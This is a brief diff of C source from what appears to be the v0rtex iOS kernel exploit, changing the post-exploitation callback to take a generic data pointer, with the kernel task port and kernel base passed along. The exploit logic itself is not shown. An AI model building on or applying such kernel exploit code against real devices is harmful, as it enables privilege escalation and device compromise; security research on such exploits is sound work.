@@ -612,7 +612,7 @@ kern_return_t readback_fakeport(io_connect_t client, uint32_t pageId, uint64_t o
 
 // ********** ********** ********** ye olde pwnage ********** ********** **********
 
-kern_return_t v0rtex(offsets_t *off, v0rtex_cb_t callback)
+kern_return_t v0rtex(offsets_t *off, v0rtex_cb_t callback, void *cb_data)
 {
     kern_return_t retval = KERN_FAILURE,
     ret = 0;
@@ -1702,7 +1702,7 @@ zm_tmp < zm_hdr.start ? zm_tmp + 0x100000000 : zm_tmp \
     
     if(callback)
     {
-        ret = callback(kernel_task, kbase, kern_ucred, kernproc_addr);
+        ret = callback(kernel_task, kbase, cb_data);
         if(ret != KERN_SUCCESS)
         {
             LOG("callback returned error: %s", mach_error_string(ret));
